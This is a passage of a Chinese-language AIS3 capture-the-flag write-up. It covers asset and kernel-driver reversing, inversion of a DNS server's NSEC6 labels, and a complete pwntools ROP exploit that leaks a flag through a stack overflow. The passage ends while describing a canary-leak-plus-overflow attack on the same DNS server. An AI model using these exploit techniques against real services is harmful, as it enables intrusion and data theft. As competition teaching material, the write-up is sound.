m = re.search(r"AIS3\{[A-Za-z_?]+\}", r.text)
if m:
    print("FLAG =", m.group(0))
```

執行結果：
```http
200
{"weapon": {"name": "Sword V", "damage": 14285734.3, "maxDurability": 114285874, "range": 3.2, "angle": 65.0, "cooldown": 0.55, "bonusGoldPercent": 0.0, "lifestealPercent": 0.0}, "armor": {"name": "AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}", "slot": "Body", "damageReduction": 0.2, "bonusMaxHp": 15, "bonusSpeed": 0}}
FLAG = AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}
```

#### Flag
```
AIS3{At_Least_U_DIDNT_MODIFY_MY_MONEY_RIGHT?}
```

---
#### Part 2：Hidden in the Cloak

#### 關鍵觀察
這題與「哇!金色傳說」使用同一個 Unity 遊戲，但題目敘述提示重點在角色身上的披風：
```
角色身上的披風被黏液沾滿了
```

因此方向不是抽卡 API，而是角色素材、貼圖或動畫資源。
在 Unity 遊戲資料中，`StreamingAssets` 常常會存放 AssetBundle。檢查資料夾可以找到：
```
Reverse1_Data/StreamingAssets/bundles/character_main
```

這個檔案看起來與角色素材有關，因此開始分析這個 AssetBundle。

#### 解包 AssetBundle
可以使用 AssetStudio、UABEA 或其他 Unity AssetBundle 工具打開：
```
Reverse1_Data/StreamingAssets/bundles/character_main
```

裡面可以找到與 Spine 動畫相關的資源，例如：
```
character.atlascharacter.jsontexture / resS
```

Spine 動畫通常會包含：

|檔案|用途|
|---|---|
|`.atlas`|記錄每個小圖塊在大圖中的位置|
|`.json` / `.skel`|骨架、slot、attachment、animation 資訊|
|texture|實際角色貼圖|

因此這題很可能是把 flag 切成多個貼圖片段，藏在角色披風相關的 attachment 裡。

#### 找到可疑貼圖片段
從 Spine 資料中可以看到披風或 slime 相關的 attachment，例如：
```
s013s014s015...s025
```

這些 attachment 對應到 atlas 裡面的貼圖區塊，例如：
```
r037r017r016r034...
```

這些區塊本身看起來只是角色披風上的圖案，但是如果把它們依照動畫座標重新排列，就會組成文字。

#### 分析動畫座標
在 Spine skeleton 的 animation 資料中，可以找到 `emote_a` 之類的動畫。
其中某個時間點會把披風相關的 attachment 排列到固定位置，例如：
```
animation: emote_a
time: 0.75
```

因此可以根據 `emote_a` 在 `time = 0.75` 時各個 attachment 的位置，把 `s013 ~ s025` 對應的圖片區塊重新排出來。

重組邏輯大致如下：
```
1. 從 character.atlas 取得每個 rXXX 圖塊在 texture 裡的位置
2. 從 skeleton JSON 取得 s013 ~ s025 對應的 attachment
3. 讀取 emote_a animation 在 time = 0.75 的座標
4. 按照座標把圖塊重新貼到同一張圖上
5. 對結果做翻轉 / 鏡像修正
6. 讀出隱藏文字
```

#### exploit.py
```python
#!/usr/bin/env python3
import argparse
import json
import re
import tempfile
import zipfile
from pathlib import Path

import UnityPy
from PIL import Image


def read_text_asset_script(obj):
    data = obj.read()
    s = data.m_Script
    if isinstance(s, bytes):
        return s.decode("utf-8")
    return s


def parse_atlas(atlas_text):
    lines = [line.rstrip("\r") for line in atlas_text.splitlines()]
    regions = {}

    i = 0
    while i < len(lines):
        name = lines[i].strip()

        if re.fullmatch(r"r\d+", name):
            region = {}
            i += 1

            while i < len(lines) and not re.fullmatch(r"r\d+", lines[i].strip()):
                line = lines[i].strip()
                if ":" in line:
                    k, v = line.split(":", 1)
                    region[k.strip()] = v.strip()
                i += 1

            xy = tuple(map(int, region["xy"].split(",")))
            size = tuple(map(int, region["size"].split(",")))

            regions[name] = {
                "xy": xy,
                "size": size,
                "rotate": region.get("rotate", "false") == "true",
            }
            continue

        i += 1

    return regions


def find_character_main(input_path):
    input_path = Path(input_path)

    if input_path.is_file() and input_path.name == "character_main":
        return input_path

    if input_path.is_dir():
        candidates = list(input_path.rglob("Reverse1_Data/StreamingAssets/bundles/character_main"))
        if candidates:
            return candidates[0]

    tmpdir = Path(tempfile.mkdtemp(prefix="cloak_extract_"))

    if input_path.is_file() and input_path.suffix == ".zip":
        with zipfile.ZipFile(input_path, "r") as z:
            z.extractall(tmpdir)

        # outer zip may contain B.zip
        inner_zips = list(tmpdir.rglob("B.zip"))
        if inner_zips:
            with zipfile.ZipFile(inner_zips[0], "r") as z:
                z.extractall(tmpdir / "B_extracted")

        candidates = list(tmpdir.rglob("Reverse1_Data/StreamingAssets/bundles/character_main"))
        if candidates:
            return candidates[0]

    raise FileNotFoundError("找不到 Reverse1_Data/StreamingAssets/bundles/character_main")


def extract_assets(bundle_path):
    env = UnityPy.load(str(bundle_path))

    skeleton = None
    atlas_text = None
    texture = None

    for obj in env.objects:
        data = obj.read()
        name = getattr(data, "m_Name", "")

        if obj.type.name == "TextAsset" and name == "character":
            skeleton = json.loads(read_text_asset_script(obj))

        elif obj.type.name == "TextAsset" and name == "character.atlas":
            atlas_text = read_text_asset_script(obj)

        elif obj.type.name == "Texture2D" and name == "character":
            texture = data.image.convert("RGBA")

    if skeleton is None:
        raise RuntimeError("找不到 skeleton JSON TextAsset: character")

    if atlas_text is None:
        raise RuntimeError("找不到 atlas TextAsset: character.atlas")

    if texture is None:
        raise RuntimeError("找不到 Texture2D: character")

    return skeleton, parse_atlas(atlas_text), texture


def reconstruct_cloak(skeleton, atlas, texture, output):
    attachments = skeleton["skins"][0]["attachments"]
    slot_to_bone = {slot["name"]: slot["bone"] for slot in skeleton["slots"]}

    emote_bones = skeleton["animations"]["emote_a"]["bones"]

    bone_x_at_075 = {}

    for bone_name, anim in emote_bones.items():
        for frame in anim.get("translate", []):
            if abs(frame["time"] - 0.75) < 1e-9:
                bone_x_at_075[bone_name] = frame.get("x", 0)

    pieces = []

    for i in range(13, 26):
        slot = f"s{i:03d}"
        bone = slot_to_bone[slot]

        attachment = attachments[slot][slot]
        region_name = attachment["path"]

        if bone not in bone_x_at_075:
            raise RuntimeError(f"{bone} 沒有 time=0.75 的座標")

        if region_name not in atlas:
            raise RuntimeError(f"{region_name} 不在 atlas 裡")

        x = bone_x_at_075[bone]

        atlas_region = atlas[region_name]
        ax, ay = atlas_region["xy"]
        aw, ah = atlas_region["size"]

        # UnityPy exported texture uses the same top-left coordinate system here.
        crop = texture.crop((ax, ay, ax + aw, ay + ah))

        pieces.append({
            "slot": slot,
            "bone": bone,
            "region": region_name,
            "x": x,
            "image": crop,
        })

    pieces.sort(key=lambda p: p["x"])

    min_x = min(p["x"] - p["image"].width / 2 for p in pieces)
    max_x = max(p["x"] + p["image"].width / 2 for p in pieces)

    canvas_w = int(max_x - min_x) + 20
    canvas_h = max(p["image"].height for p in pieces) + 20

    # Use black background because the hidden characters are white.
    canvas = Image.new("RGBA", (canvas_w, canvas_h), (0, 0, 0, 255))

    for p in pieces:
        img = p["image"]
        px = int(round(p["x"] - img.width / 2 - min_x)) + 10
        py = (canvas_h - img.height) // 2
        canvas.alpha_composite(img, (px, py))

    canvas.save(output)

    print("[+] pieces:")
    for p in pieces:
        print(f"    {p['slot']} / {p['bone']} / {p['region']} / x={p['x']}")

    print(f"[+] reconstructed image saved to: {output}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "input",
        help="dist zip / B.zip / extracted B directory / character_main",
    )
    parser.add_argument(
        "-o",
        "--output",
        default="cloak_flag.png",
        help="output image path",
    )

    args = parser.parse_args()

    bundle_path = find_character_main(args.input)
    print(f"[+] character_main = {bundle_path}")

    skeleton, atlas, texture = extract_assets(bundle_path)
    reconstruct_cloak(skeleton, atlas, texture, args.output)


if __name__ == "__main__":
    main()
```

#### 重組後結果
重組披風碎片後，可以看到文字：
```
AIS3{d0n7_70uch_my_c4p3_0k_b3f1e768}
```

---

### alt + f4
#### 關鍵觀察
檔案裡很多 policy / malware 相關字串是干擾，真正重點在 Windows kernel driver 的 syscall hook 與 magic value。

#### 初步檢查檔案
解壓題目檔案後，可以先檢查檔案類型：
```
file alt+f4.sys
```
結果可以看出它是 Windows PE 格式的 kernel driver。

也可以用 `strings` 初步查看：
```
strings alt+f4.sys | less
```

其中會看到一些看似和安全政策、惡意程式相關的字串，但這些不是主要解題點。真正重要的是 driver 裡的 syscall hook 與 flag 派生邏輯。

#### 逆向分析方向
將 `alt+f4.sys` 丟進 Binary Ninja 後，重點觀察：
- DriverEntry
- 全域變數
- syscall dispatch / hook 相關邏輯
- 有沒有 SHA-256 常數或 hash function
- 有沒有 flag mask / XOR byte array

這題的主要邏輯可以整理成：
```
records[index++] = magic_value;if (index == 8) {    derive_flag(records);}
```

也就是說，driver 會在特定 syscall 被觸發時，把對應的 magic value 存起來。當收集滿 8 個值後，就會進入 flag 產生流程。

#### syscall 與 magic value

經過逆向後，可以整理出真正需要的 8 個事件值：
```
eff354f6ffb66d59ce3deab3ee6001e92f5cbfaa1ece9efd909053f93f8408b4
```

對應的 syscall 大致如下：

| 順序  | Syscall               | Magic value  |
| --- | --------------------- | ------------ |
| 1   | `NtCreateEvent`       | `0xeff354f6` |
| 2   | `NtDelayExecution`    | `0xffb66d59` |
| 3   | `NtCreateMutant`      | `0xce3deab3` |
| 4   | `NtSetEvent`          | `0xee6001e9` |
| 5   | `NtCreateSemaphore`   | `0x2f5cbfaa` |
| 6   | `NtReleaseMutant`     | `0x1ece9efd` |
| 7   | `NtCreateFile`        | `0x909053f9` |
| 8   | `NtFreeVirtualMemory` | `0x3f8408b4` |

其中有些值不是單純固定常數，而會和 Windows 的 `KUSER_SHARED_DATA` 內容有關。
比較重要的兩個 offset：
```
KUSER_SHARED_DATA + 0x260 = NtBuildNumberKUSER_SHARED_DATA + 0x2ec = SafeBootMode
```

題目環境中使用的 build number 為 `26200`，所以 `NtDelayExecution` 對應值會被算成：
```
0xffb66d59
```

#### 還原 flag 產生演算法
driver 收集完 8 個 value 後，會先計算一個 64-bit hash。
邏輯可以還原成：
```
h = records[0] ^ 0x2b5a5for x in records[1:]:    h = (h * 33) & 0xffffffffffffffff    h ^= x
```

接著會對這個 64-bit hash 做兩次 SHA-256：
```
d1 = sha256(h.to_bytes(8, "little")).digest()d2 = sha256(d1).digest()
```

最後 driver 會將 hash 結果與內建 mask XOR，產生 flag。

#### Exploit
以下是完整還原腳本：
```python
from hashlib import sha256

records = [
    0xeff354f6,
    0xffb66d59,
    0xce3deab3,
    0xee6001e9,
    0x2f5cbfaa,
    0x1ece9efd,
    0x909053f9,
    0x3f8408b4,
]

mask = bytes.fromhex(
    "4c237bd8fd2e27fce89e406f50df2b7011170047b3b0bb61"
    "a89f1cd4dcd103b4"
)

h = records[0] ^ 0x2b5a5

for x in records[1:]:
    h = (h * 33) & 0xffffffffffffffff
    h ^= x

d1 = sha256(h.to_bytes(8, "little")).digest()
d2 = sha256(d1).digest()

flag = bytes(a ^ b for a, b in zip(d1, mask))
flag += bytes([
    d2[0] ^ 0x6e,
    d2[1] ^ 0x21,
    d2[2] ^ 0xa2,
])

print(flag.decode())
```

#### Flag
```
AIS3{S4dt_H00k_9reAt_bY_ALTsyscall}
```

### DG Server (Rev)
#### 題目敘述
表面上它像一個 DNSSEC 驗證器，但真正的重點不是盲猜子網域，而是把 server 內部的 NSEC6 產生流程拆出來，再把被藏起來的 owner name 反推回來。
最後拿到的 flag 來自一筆 `TXT` 記錄，但 `dg-verify.py` 本身只驗 `A`、`NS`、`MX`，所以不能只靠 verifier 直接跑完整解。這也是為什麼這題本質上是 reverse engineering，不是 brute force。

#### 關鍵觀察
Verifier 使用本地 `dg.conf` / key format 搭配 NSEC6 類似演算法，目標是從 hash / proof 反推出 hidden owner。

#### Files
- `/home/hamichi/ctf/challenges/dg-server/unpacked/dg-server`
  - 靜態編譯、strip 掉符號的 x86-64 server binary，非 PIE，位址固定。
- `/home/hamichi/ctf/challenges/dg-server/unpacked/scripts/dg-verify.py`
  - 遠端驗證腳本，負責查 DNS 並驗證 trust chain。
- `/home/hamichi/ctf/challenges/dg-server/remote_verify.txt`
  - 遠端 verifier 的實際輸出，用來對照 DNSKEY、DS、SOA 與已知 record。
- `/home/hamichi/ctf/challenges/dg-server/invert_nsec6_label.py`
  - 用來反轉 NSEC6 label 的 helper。
- `/home/hamichi/ctf/challenges/dg-server/recover_nsec6_context.py`
  - 用已知 owner label 反推出 NSEC6 context 的 helper。
- `/home/hamichi/ctf/challenges/dg-server/localtest/dg.conf`
  - 本地設定檔。
- `/home/hamichi/ctf/challenges/dg-server/localtest/key.txt`
  - 本地金鑰格式範例。

#### Verifier Behavior
`dg-verify.py` 的工作流程很像縮小版 DNSSEC 驗證器。它先從 root trust anchor 開始，驗 `. DNSKEY`，再一路往下驗 `DS`、子區域 `DNSKEY`、`SOA`，最後才驗目標 RRset。

它的查詢路徑是 HTTP API，會打到 `/dns-query?name=...&type=...`。重點是它只接受三種目標類型，原始碼裡直接寫死：`A`、`NS`、`MX`。如果指定別的型別，腳本會報錯。

所以這題真正的 TXT 只能靠直接對 challenge endpoint 發查詢，不是靠 `dg-verify.py` 驗過來的。這個限制也剛好暗示，題目要解的是名稱和簽章鏈，而不是單純把 verifier 跑一遍。

#### Remote Reconnaissance
`remote_verify.txt` 提供了完整的遠端鏈：
- `.` -> `sleeping.` -> `curious.sleeping.`
- `curious.sleeping.` 底下已知的 record 包含 `www`、`api`、`ftp`、`mail`、`ns1`、`status`、`_dmarc`
- 遠端還出現一個未知的 NSEC6 owner label：`S6NPJID2K4SNE7AB754D34I8IK3E8TKJ.curious.sleeping.`

我先對照 `remote_verify.txt` 確認 DNSKEY 與 SOA 的值，再把已知 label 跟本地 reverse 出來的 NSEC6 實作比對。結果 `api` 和 `www` 等 label 都能正確重現，代表 server 內的 NSEC6 演算法已經抓對了。

另外，對 `S6NPJID2K4SNE7AB754D34I8IK3E8TKJ.curious.sleeping.` 直接查 `TXT` 會是 NXDOMAIN。這個字串不是明文 owner，而是被 NSEC6 隱藏過的 hashed owner。

#### Binary/Config Reverse Engineering
`unpacked/dg-server` 是靜態、strip、non-PIE 的 binary，所以函式位址是穩定的，逆向時很好對照。
幾個關鍵函式如下：
- `0x4053ef`，計算 NSEC6 的 zone context
- `0x405a23`，計算 NSEC6 的 owner label
- `0x405909`，base32hex encoder
- `0x40532f`，canonicalize owner 的第一個 label

這四個點串起來，就能還原它如何把 DNS label 變成 NSEC6 owner hash，再變成公開的 32 字元 base32hex 字串。

#### Local dg.conf/key Format
本地設定檔 `localtest/dg.conf` 的語法很簡單：
```text
zone "."
file "zone.db"
key "key.txt"
}
```

`key.txt` 則是：
```text
PRIVATEKEY 257 15 <32-byte-hex-seed>
PRIVATEKEY 256 15 <32-byte-hex-seed>
```

也就是說，KSK 與 ZSK 都要有，而且分別是 `257` 和 `256`。這個格式和遠端驗證輸出的 DNSKEY 對得上。實測本地 server 啟動後，在 `57575` port 上可以正常查詢。

#### NSEC6 Algorithm
這題的 NSEC6 不是標準 DNSSEC NSEC3，也不是單純的 hash。它會先從 zone metadata、DNSKEY、SOA serial 等資料產生 40-byte context，接著把 owner 的第一個 DNS label 做一連串混淆，最後再用 base32hex 編碼成公開的 NSEC6 owner label。

NSEC6 參數是 `2e 426 0009 73311337`，base32hex alphabet 是 `0123456789ABCDEFGHIJKLMNOPQRSTUV`。

逆向 `0x4053ef` 後可以重建 context generation；再逆 `0x405a23`、`0x405756`、`0x40588c`、`0x405909` 後，可以完整重現遠端已知 label。`recover_nsec6_context.py` 是過程中用來輔助分析 context 的實驗腳本，而最後可重現的 solve 主要靠 binary-derived implementation 與 `invert_nsec6_label.py`。

用遠端目前的 `curious.sleeping.` DNSKEY 與 SOA serial `2026040101` 重現後，已知 label 能完全對上，包含：
- `api -> H46HSBFKHOSNE79276V7EUQ3RFHKIUGI`
- `www -> H46HSBFKHOSNE792RC9U2UQ3RFHKIUGI`
- `_dmarc -> H46HSBFKHOSNE7FP2CD05BFU13HKIUGI`
- `status -> H46HSBFKHOSNE7FP4U5AT4KL73HKIUGI`

重要的可逆 transform 可以濃縮成這樣：
```python
def salt_inverse(buf):
    for r in reversed(range(9)):
        for i in reversed(range(20)):
            buf[i] = (buf[i] - ((r * 17 + i) & 255)) & 255
            buf[i] ^= CTX2[(r + i) % 20]
        buf = buf[1:] + buf[:1]
    return buf
```

前向流程則是相反順序，先把最後一個 byte rotate 到前面，再做 XOR 與加法。這也是為什麼這題可以反推，而不是去猜 160-bit hash。

#### Key Vulnerability/Insight
真正的關鍵在於，遠端 context 的前 20 bytes 最後變成了全 `0xff`，所以核心 owner hash 在最後一層被抹掉了。公開出去的 label 其實已經是「第一個 DNS label wire format」經過最後可逆變換後的結果。

換句話說，這不是要你撞出某個未知 owner，而是要你把已經藏好的 label 逆回 DNS wire format。只要看懂這點，就知道該走逆向，不該走 brute force。

未知的 NSEC6 hash `S6NPJID2K4SNE7AB754D34I8IK3E8TKJ` 也因此變成可逆問題，不是暴力搜尋問題。

#### Inversion of Hidden Owner
`invert_nsec6_label.py` 做的事情很直接，先把 base32hex 解碼，再跑反向 salt transform，最後把結果加 `1`，就能還原出 wire format 中的第一個 label。

概念上可以寫成：
```python
after = salt_inverse(b32hex_decode("S6NPJID2K4SNE7AB754D34I8IK3E8TKJ"))
wire = (int.from_bytes(after, "big") + 1).to_bytes(20, "big")
length = wire[0]
owner = wire[1:1+length].decode()
```

實際反推結果是：
- `after_inv = 10617a667430617a786374377574637976ffffff`
- `wire+1 = 10617a667430617a786374377574637977000000`
- `length = 0x10`
- `hidden owner = azft0azxct7utcyw`

所以被藏起來的 owner 完整名稱是：`azft0azxct7utcyw.curious.sleeping.`

#### Final Verification
因為 `dg-verify.py` 只支援 `A`、`NS`、`MX`，我不是拿它驗 `TXT`，而是直接對 challenge endpoint 查：
```text
azft0azxct7utcyw.curious.sleeping. TXT
```

回來的結果就是 flag。這一步把整條推導鏈收尾，也證明前面反推的 owner 是對的。
```text
azft0azxct7utcyw.curious.sleeping. TXT "AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}"
azft0azxct7utcyw.curious.sleeping. RRSIG TXT 15 3 3600 ... curious.sleeping. ...
```

#### Flag
```text
AIS3{w4lking_0n_D0H_z0n3--NSEC...NSEC6!_666~~~}
```

## pwn

### std::print("Hello, World") revenge
#### 題目敘述
題目暗示 C++20 / C++23 的 std::print 本身不像傳統 C 的 printf 一樣有 format string vulnerability。也就是說，不能直接透過 %p, %s, %n 這類格式化字串技巧任意讀寫記憶體。
但題目實際上的漏洞並不在 std::print 本身，而是在程式讀取輸入時發生 stack buffer overflow。
#### 關鍵觀察
檢查 binary 保護：
```
RELRO:    Full RELRO
Canary:   No canary
NX:       Enabled
PIE:      No PIE
```

#### 主要函式 **main**
反組譯後可以看到程式大致流程如下：
```c
int main() {
    load_flag();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    show_number();
    while (true) {
        Question();
    }
}
```

程式一開始會先呼叫 `load_flag()`，把 flag 讀進全域變數 FLAG。

#### load_flag
```
0000000000403506 <load_flag>:
    fopen("flag.txt", "r")
    fread(FLAG, 1, 0x7f, fp)
    FLAG[n] = 0
```

重要資訊：
`FLAG buffer address = 0x427040`
也就是說，flag 已經被載入到固定的 `.bss` 位址。

#### show_number
`show_number()` 會呼叫 `std::print`，格式字串類似：
`std::print("Value: {2}\n", a, b, c);`

正常執行時會印：
`Value: 1337`
這個函式本身不是漏洞，但 exploit 會重用這段程式碼，讓它幫我們輸出 flag bytes。
#### Question
漏洞點在 `Question()`：
```
00000000004035d4 <Question>:
    sub rsp, 0x50
    lea rax, [rbp-0x50]
    mov edx, 0xe0
    mov rsi, rax
    mov edi, 0
    call read
    cmp byte ptr [rbp-0x50], 'Y'
    je ok
    cmp byte ptr [rbp-0x50], 'y'
    je ok
    exit(0)
ok:
    leave
    ret
```

等價 C code：
```c
void Question() {
    char buf[0x50];
    read(0, buf, 0xe0);
    if (buf[0] != 'Y' && buf[0] != 'y') {
        exit(0);
    }
}
```

這裡 `buf` 只有 `0x50 bytes`，但 `read` 讀入 `0xe0 bytes`。
因此可以覆蓋：
```
buf
saved rbp
return address
offset 計算：
buffer size       = 0x50
saved rbp size    = 0x08
return address offset = 0x58
```

所以 payload 前 `0x58 bytes` 後面就是 `RIP`。
#### 漏洞說明
這題不是傳統 format string vulnerability。
`std::print` 的格式字串在 C++ 裡是 type-safe 的，不能像 `printf(user_input)` 那樣直接被濫用。

真正的漏洞是：
`stack buffer overflow in Question()`

利用條件：
1. binary 沒有 stack canary
2. binary 沒有 PIE，所以 gadget / function address 固定
3. flag 已經被讀進固定 `.bss` 位址 `0x427040`
4. 可以 ROP 控制程式流程
#### Exploit 思路
目標是讀出記憶體中的 FLAG。
因為沒有 `puts` / `write` 這種很方便的輸出函式可以直接呼叫，而且 gadget 也不完整，所以採用

一個比較特別的方式：
利用 `std::print` 本身來輸出 flag。
#### 核心想法
`show_number()` 原本會準備三個整數，然後呼叫：
`std::print(format, a, b, c);`

而格式字串、三個參數指標都放在 stack 上。
如果我們可以控制 stack layout，就能讓 `std::print` 把某段記憶體解讀成三個 `int` 印出來。
一個 `int` 是 4 bytes。
三個 `int` 一次可以 leak：
`4 * 3 = 12 bytes`
因此 exploit 每次 leak 12 bytes flag，重複連線直到取得完整 flag。

#### ROP 流程
已知重要位址：
```
FLAG       = 0x427040
READ_PLT   = 0x403310
POP_RDI    = 0x416e51  # pop rdi ; pop rbp ; ret
POP_RSI    = 0x4153f7  # pop rsi ; pop rbp ; ret
POP_RBP    = 0x4034ed  # pop rbp ; ret
SHOW_SETUP = 0x403599
```

其中 `SHOW_SETUP = 0x403599` 是 `show_number()` 中設定參數的位置。
原本 `show_number()` 會做：
```
lea rdi, [rbp-0x1c]
lea rcx, [rbp-0x18]
lea rdx, [rbp-0x14]
mov rsi, [rbp-0x10]
mov rax, [rbp-0x8]
call std::print
```

也就是說，只要控制 `rbp` 指向我們安排好的 fake stack，就能讓它把我們想 leak 的資料當成三個 `int`。

#### 為什麼要呼叫 `read`？
如果直接讓 `rbp` 指向 `FLAG + offset，show_number()` 會讀：
```
[rbp - 0x1c]
[rbp - 0x18]
[rbp - 0x14]
[rbp - 0x10]
[rbp - 0x08]
```

但 FLAG 裡面原本是純 flag 字串，沒有我們需要的 fake stack metadata，例如 format string 指標與長度。
因此 exploit 做法是：
5. 先保留要 leak 的 12 bytes flag
6. 從 `FLAG + offset + 0x0c` 開始寫入 fake stack
7. 將 `rbp` 設成 `FLAG + offset + 0x1c`
8. 跳進 `show_number()` 的參數設定區

這樣：
```
[rbp - 0x1c] = FLAG[offset + 0x00 : offset + 0x04]
[rbp - 0x18] = FLAG[offset + 0x04 : offset + 0x08]
[rbp - 0x14] = FLAG[offset + 0x08 : offset + 0x0c]
[rbp - 0x10] = format string length
[rbp - 0x08] = format string pointer
```

前三個位置保留原本 flag bytes，後面位置由第二階段 `read()` 寫入。
#### Format String
使用的格式字串是：
```
{2:08x}{1:08x}{0:08x}
```

因為 x86-64 calling convention 下，實際傳進 `std::print` 的三個 int pointer 順序跟 stack 上安排的順序會對應成 reversed order。
所以要用：
```
{2:08x}{1:08x}{0:08x}
```

才能按照記憶體原本順序輸出 flag bytes。
每個 int 印成 8 個 hex 字元，因此一次 leak 24 個 hex 字元，也就是 `12 bytes`。
#### Exploit
```python
#!/usr/bin/env python3
from pwn import *
import re
context.arch = 'amd64'
context.log_level = 'error'
BIN = './chall'
FLAG = 0x427040
READ_PLT = 0x403310
POP_RDI_RBP = 0x416e51
POP_RSI_RBP = 0x4153f7
POP_RBP = 0x4034ed
SHOW_SETUP = 0x403599
OFFSET_TO_RIP = 0x58
FMT = b'{2:08x}{1:08x}{0:08x}\n'
def build_payload(offset):
    target = FLAG + offset + 0x0c
    fake_rbp = FLAG + offset + 0x1c
    payload = b'y'
    payload += b'A' * (OFFSET_TO_RIP - 1)
    # read(0, FLAG + offset + 0x0c, 0xe0)
    # rdx already remains 0xe0 after Question()'s read
    payload += p64(POP_RDI_RBP)
    payload += p64(0)
    payload += p64(0)
    payload += p64(POP_RSI_RBP)
    payload += p64(target)
    payload += p64(0)
    payload += p64(READ_PLT)
    # set rbp to fake stack and jump into show_number setup
    payload += p64(POP_RBP)
    payload += p64(fake_rbp)
    payload += p64(SHOW_SETUP)
    # fake stack data written into FLAG + offset + 0x0c
    stage2 = p64(len(FMT))
    stage2 += p64(fake_rbp)
    stage2 += FMT
    return payload, stage2
def leak_chunk(io, offset):
    payload, stage2 = build_payload(offset)
    io.recvuntil(b'Value: 1337\n')
    io.send(payload)
    io.send(stage2)
    data = io.recvuntil(b'\n', timeout=2)
    m = re.search(rb'([0-9a-fA-F]{24})', data)
    if not m:
        raise RuntimeError(f'leak failed: {data!r}')
    hx = m.group(1).decode()
    chunk = b''
    for i in range(0, 24, 8):
        chunk += int(hx[i:i + 8], 16).to_bytes(4, 'little')
    return chunk
def leak_remote():
    flag = b''
    for offset in range(0, 96, 12):
        io = remote('chals1.ais3.org', 50002)
        flag += leak_chunk(io, offset)
        io.close()
        if b'}' in flag:
            break
    return flag.split(b'\x00', 1)[0]
if __name__ == '__main__':
    flag = leak_remote()
    print(flag.decode())
```

#### Exploit
1. 程式啟動時先執行 `load_flag()`，把 `flag.txt` 讀到全域變數 FLAG，位址固定為 `0x427040`。
2. 進入 `Question()` 後，程式用：
	`read(0, buf, 0xe0);`
	但 `buf` 只有 `0x50 bytes`，因此可以 overflow 到 saved RBP 和 return address。
3. payload 第一個 byte 放 `y`，通過檢查：
	```
	if (buf[0] != 'Y' && buf[0] != 'y')
	    exit(0);
	```
4. 填滿 `0x58 bytes`，覆蓋 return address，開始 ROP。
5. ROP 先設定：
   ```
	rdi = 0
	rsi = FLAG + offset + 0x0c
   ```

然後呼叫 `read@plt`。
6. 這次 `read()` 會把第二階段資料寫到 `FLAG + offset + 0x0c`。
7. 第二階段資料用來偽造 `show_number()` 需要的 stack layout：
   ```
	[rbp - 0x1c] = 要 leak 的 flag 前 4 bytes
	[rbp - 0x18] = 要 leak 的 flag 中 4 bytes
	[rbp - 0x14] = 要 leak 的 flag 後 4 bytes
	[rbp - 0x10] = format string 長度
	[rbp - 0x08] = format string 指標
   ```

8. 因為第二階段是從 `FLAG + offset + 0x0c` 開始寫，所以不會覆蓋前 12 bytes flag。這 12 bytes 會保留下來，等等被當成三個 int 印出。
9. ROP 接著設定：
	`rbp = FLAG + offset + 0x1c`
10. 跳到 `show_number()` 中間的參數設定位置：
	`SHOW_SETUP = 0x403599`
11. `show_number()` 會根據 fake RBP 從 `FLAG` 附近取出三個 `int` 指標，然後呼叫 `std::print`。
12. 使用格式字串：
	`{2:08x}{1:08x}{0:08x}`
	將三個 `int` 以 hex 印出。
13. 一次可以 leak：
	`3 * 4 bytes = 12 bytes`
14. exploit 把輸出的 hex 轉回 bytes，得到一段 flag。
15. 每次連線 leak 12 bytes，offset 依序加上：
	`0, 12, 24, 36, ...`
16. 重複直到遇到 }，代表完整 flag 已取得。
17. 最後重組得到：`AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}`

Flag：`AIS3{f4k3_fl4g_1s_4ls0_4_fl4g}`

### DG Server (Pwn)

#### 題目敘述
題目提供一個 `dg-server`，是一個類似 DNS over HTTP 的服務。官方提供的驗證方式如下：
```bash
python3 dg-verify.py @chals1.ais3.org:57573 www.curious.sleeping A
```

服務會處理像這樣的 HTTP request：
```http
GET /dns-query?name=www.curious.sleeping.&type=A HTTP/1.1
Host: chals1.ais3.org
```

正常情況下，伺服器會根據 `name` 與 `type` 回傳 DNS-like record，例如：
```text
www.curious.sleeping. A 67.67.67.67
www.curious.sleeping. RRSIG A ...
```

這題的漏洞出現在 `/dns-query` 的 query string parser，尤其是 `type=` 參數的處理。當 `type` 是非法 DNS type 時，錯誤處理邏輯會把 stack 上的資料以 hex 格式輸出，造成 stack leak。接著再利用同一個 `type=` 參數觸發 stack overflow，配合 ROP 讀取 `/flag.txt`。

#### Binary 保護機制
使用 `checksec` 檢查：
```text
RELRO           STACK CANARY      NX            PIE
Partial RELRO   Canary found      NX enabled    No PIE
```

重點：
- `No PIE`：程式碼位址固定，ROP gadget 可以直接使用。
- `NX enabled`：stack 不可執行，需要使用 ROP。
- `Canary found`：overflow 前必須先 leak canary。
- Static linked：binary 很大，內部有足夠多可用的 ROP gadgets。

#### 漏洞說明
當送出合法查詢：
```http
GET /dns-query?name=www.curious.sleeping.&type=A HTTP/1.1
```

伺服器會正常回傳 A record。
如果送出不存在的 DNS type：
```http
GET /dns-query?name=www.curious.sleeping.&type=BBBBBBBB HTTP/1.1
```

伺服器會進入 invalid query type 的錯誤處理路徑，回傳類似：
```json
{
  "Status": 4,
  "Comment": "invalid query type",
  "bad_type": "..."
}
```

其中 `bad_type` 會把目前 stack 上的 type buffer 以 hex 形式輸出。
問題是輸出長度不只包含使用者輸入，還會讀超過 type buffer，導致 stack 上的敏感資料被 leak 出來。

例如送出長度 56 的 `type`：
```text
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

會得到類似：
```text
4242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424200...
```

將 leak 出來的 hex 轉成 bytes 後，可以在固定 offset 取出：
```text
offset 0x00 ~ 0x37: 使用者輸入的 B
offset 0x38 ~ 0x3f: stack canary
offset 0x40 ~ 0x47: saved RBP
offset 0x48 ~ 0x4f: saved return address
```

因此可以先 leak canary，再進行 stack overflow。

#### 漏洞說明
`type=` 參數的處理大致有兩個問題：
1. Invalid type error path 會 dump `type` buffer。
2. Dump 長度計算錯誤，導致讀取超出 buffer 範圍。

另外，`type=` 會先經過 URL percent-decoding，因此可以透過：
```text
%41%41%41%00%ff...
```

傳入任意 raw bytes。這點很重要，因為 ROP payload 需要包含 `\x00`，尤其是 canary 的第一個 byte 通常就是 null byte。

#### 解法
整體利用分成兩階段
